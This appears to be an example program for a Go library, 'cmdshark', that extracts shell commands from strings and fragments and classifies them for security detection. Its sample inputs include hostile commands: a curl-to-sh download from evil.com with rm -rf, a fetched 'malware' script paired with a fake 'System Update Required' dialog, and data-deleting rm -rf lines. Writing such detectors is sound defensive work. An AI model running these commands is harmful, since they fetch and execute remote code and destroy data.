package main

import (
	"fmt"
	"github.com/katalinaware/cmdshark"
)

func main() {
	extractor := cmdshark.NewExtractor()
	
	fmt.Println("=== Example 1: Single String Extraction ===")
	maliciousString := "bash -c 'curl http://evil.com/payload | sh && rm -rf /tmp/*'"
	commands := extractor.ExtractFromString(maliciousString)
	
	for i, cmd := range commands {
		fmt.Printf("[%d] Command: %s\n", i+1, cmd.Command)
		fmt.Printf("    Confidence: %.3f\n", cmd.Confidence)
		fmt.Printf("    Tags: %v\n", cmd.Tags)
		fmt.Printf("    Syntax OK: %v\n", cmd.SyntaxOK)
		fmt.Println()
	}
	
	fmt.Println("=== Example 2: Fragment Assembly ===")
	fragments := []string{
		"curl", "http://malicious.com/script",
		"&&", "chmod", "+x", "/tmp/malware",
		"&&", "osascript", "-e", "display dialog \"System Update Required\"",
	}
	commands = extractor.ExtractFromFragments(fragments)
	
	for i, cmd := range commands {
		fmt.Printf("[%d] Command: %s\n", i+1, cmd.Command)
		fmt.Printf("    Confidence: %.3f\n", cmd.Confidence)
		fmt.Printf("    Fragmentation: %d fragments\n", cmd.FragmentationLevel)
		fmt.Printf("    Methods: %v\n", cmd.Methods)
		fmt.Printf("    Tags: %v\n", cmd.Tags)
		fmt.Println()
	}
	
	fmt.Println("=== Example 3: Command Classification ===")
	mixedCommands := []string{
		"curl http://example.com/payload",
		"osascript -e 'display dialog \"hello\"'",
		"rm -rf /important/data",
		"cp file.txt backup.txt", 
		"python3 /tmp/script.py",
	}
	
	allCommands := []cmdshark.Command{}
	for _, cmdStr := range mixedCommands {
		extracted := extractor.ExtractFromString(cmdStr)
		allCommands = append(allCommands, extracted...)
	}
	
	networkCmds := extractor.GetNetworkCommands(allCommands)
	executionCmds := extractor.GetExecutionCommands(allCommands)
	suspiciousCmds := extractor.GetSuspiciousCommands(allCommands)
	fileOpsCmds := extractor.GetFileOperationCommands(allCommands)
	macosCmds := extractor.GetMacOSCommands(allCommands)
	
	fmt.Printf("Network commands: %d\n", len(networkCmds))
	for _, cmd := range networkCmds {
		fmt.Printf("  - %s\n", cmd.Command)
	}
	
	fmt.Printf("Execution commands: %d\n", len(executionCmds))
	for _, cmd := range executionCmds {
		fmt.Printf("  - %s\n", cmd.Command)
	}
	
	fmt.Printf("Suspicious commands: %d\n", len(suspiciousCmds))
	for _, cmd := range suspiciousCmds {
		fmt.Printf("  - %s (confidence: %.3f)\n", cmd.Command, cmd.Confidence)
	}
	
	fmt.Printf("File operation commands: %d\n", len(fileOpsCmds))
	for _, cmd := range fileOpsCmds {
		fmt.Printf("  - %s\n", cmd.Command)
	}
	
	fmt.Printf("macOS commands: %d\n", len(macosCmds))
	for _, cmd := range macosCmds {
		fmt.Printf("  - %s\n", cmd.Command)
	}
	
	fmt.Println("\n=== Example 4: JSON Output ===")
	highConfidenceCommands := extractor.FilterByConfidence(allCommands, 0.6)
	jsonOutput, err := extractor.ToJSON(highConfidenceCommands)
	if err != nil {
		fmt.Printf("Error generating JSON: %v\n", err)
	} else {
		fmt.Println(jsonOutput)
	}
	
	fmt.Println("\n=== Example 5: Custom Configuration ===")
	config := cmdshark.Config{
		MinConfidence:         0.3,
		MaxWindow:            15,
		MaxJoinChars:         800,
		Dedupe:               true,
		MaxFragmentsTotal:    30,
		MaxFragmentsPerSegment: 5,
	}
	
	customExtractor := cmdshark.NewExtractorWithConfig(config)
	customCommands := customExtractor.ExtractFromString("time to copy the file && killall Terminal")
	
	fmt.Printf("Custom extractor found %d commands:\n", len(customCommands))
	for _, cmd := range customCommands {
		fmt.Printf("  - %s (confidence: %.3f)\n", cmd.Command, cmd.Confidence)
	}
}